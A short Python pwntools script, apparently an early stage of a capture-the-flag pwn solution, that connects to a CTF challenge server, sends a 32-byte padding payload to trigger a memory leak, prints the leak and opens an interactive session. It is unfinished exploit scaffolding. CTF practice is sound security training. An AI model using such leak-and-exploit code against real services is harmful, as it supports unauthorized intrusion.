from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./incontinent_dist')
p=remote("chals.cyberjousting.com",1366)

payload=b'a'*32

p.sendlineafter("it?",payload)
p.recvuntil(b'said: ')
leak=p.recvline().strip()
print(leak)
p.interactive()
